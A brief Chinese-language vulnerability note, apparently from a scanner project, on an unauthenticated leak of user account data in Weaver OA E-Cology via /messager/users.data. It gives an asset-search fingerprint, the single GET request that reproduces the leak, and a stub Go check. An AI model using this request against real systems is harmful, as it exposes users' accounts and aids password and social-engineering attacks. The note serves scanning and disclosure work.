---
source: "TD0U/WeaverScan"
---

# 泛微OA users.data 敏感信息泄漏漏洞

## 漏洞描述

泛微OA 的 `/messager/users.data` 接口存在未授权访问漏洞（缺陷编号 wooyun-2015-0129483）。该接口无需登录即可访问，返回经过 XML+base64 编码的用户信息数据，攻击者可解码获取系统中的用户账号等敏感信息。

## 漏洞影响

```
泛微OA E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```
GET /messager/users.data HTTP/1.1
```

响应返回 XML 格式数据，其中用户信息经 base64 编码。解码后可获取用户账号、姓名等敏感信息，为进一步攻击（如密码碰撞、社工）提供基础数据。

参考 PoC（Go，来源 TD0U/WeaverScan）：

```go
func UsersData(target string) {
    url := target + "/messager/users.data"
    // GET 请求，响应 200 即存在未授权信息泄漏
}
```
